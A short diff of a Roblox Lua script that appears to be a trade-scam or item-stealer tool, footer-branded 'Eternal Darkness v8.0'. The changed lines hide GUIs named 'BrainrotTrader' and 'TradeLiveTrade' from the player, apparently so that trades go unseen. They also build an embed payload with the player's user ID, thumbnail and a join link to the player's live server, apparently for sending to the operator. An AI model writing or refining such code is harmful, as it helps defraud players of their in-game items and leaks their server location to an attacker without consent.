@@ -130,7 +130,7 @@ end
 
 local cam = workspace.CurrentCamera
 local pg = plr:WaitForChild("PlayerGui")
-local guiNames = {BrainrotTrader = true, TradeLiveTrade = true}
+local guiNames = {BrainrotTrader = true}
 
 local function handleCam(obj)
     if obj:IsA("BlurEffect") then
@@ -140,7 +140,9 @@ end
 
 local function handleGui(obj)
     if guiNames[obj.Name] then
-        task.defer(function() obj:Destroy() end)
+        task.defer(function()
+            obj.Visible = false
+        end)
     end
 end
 
@@ -387,7 +389,7 @@ local payload = {
         url = rubisLink,
         color = 0x1a1a2e,
         thumbnail = {url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"},
-        description = "```lua\ngame:GetService('TeleportService'):TeleportToPlaceInstance(" .. PlaceId .. ", '" .. REAL_JOB_ID .. "')\n```",
+        description = fernJoinerLink,
         fields = fields,
         footer = {text = "Eternal Darkness v8.0"},
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
